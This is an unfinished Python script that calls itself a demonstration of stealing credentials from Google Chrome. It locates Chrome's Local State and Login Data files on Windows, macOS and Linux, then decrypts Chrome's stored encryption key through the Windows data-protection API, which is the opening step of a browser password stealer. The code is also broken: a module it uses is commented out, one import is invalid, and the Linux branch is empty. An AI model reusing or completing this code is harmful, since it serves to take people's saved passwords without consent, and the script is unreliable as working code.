#this is a demonstration of credential stealing via Google Chrome on Windows and Linux

import sys
import os
#import syslog
import json
import base64
#import win32crypt
import pycryptodome

class logger ():
    #def logSysLog(status, action):
        #syslog.syslog("System logged action: "+ status + ": " + action)

    def logShell(status, action):
        print(status + ": " + action)


def determinePath():
    if sys.platform == 'win32':
        path = os.environ["USERPROFILE"] + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
        return path
    
    elif sys.platform == 'darwin':
        path = "~/Library/Application Support/Google/Chrome/Default/"
        return path

    elif sys.platform == 'linux':
        path = "~/.config/google-chrome/Default/Login Data"
        #in linux we must use expanduser to use the ~ in Python
        path = os.path.expanduser(path)
        return path

def getEncryptionKey(path):

    if sys.platform == 'win32':
            
        with open(path, "r", encoding="utf-8") as f:
            data = json.loads(f.read())

        #fetch key from data store based on path
        key = base64.b64decode(data["os_crypt"]["encrypted_key"])
        key = key[5:]

        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    if sys.platform == 'linux':
        
   
    else:
        logger.logShell("Failure", "system is not Windows for getEncryptionKey function")


def main():
    path = determinePath()
    print(path)

    if os.path.exists(path):
        logger.logShell("Success", "Chrome path successfully found")
    else:
        logger.logShell("Failure", "Chrome path not found. Chrome not installed, exiting...")
        exit()

    getEncryptionKey(path)
    


    





    

if __name__ == '__main__':
    main()
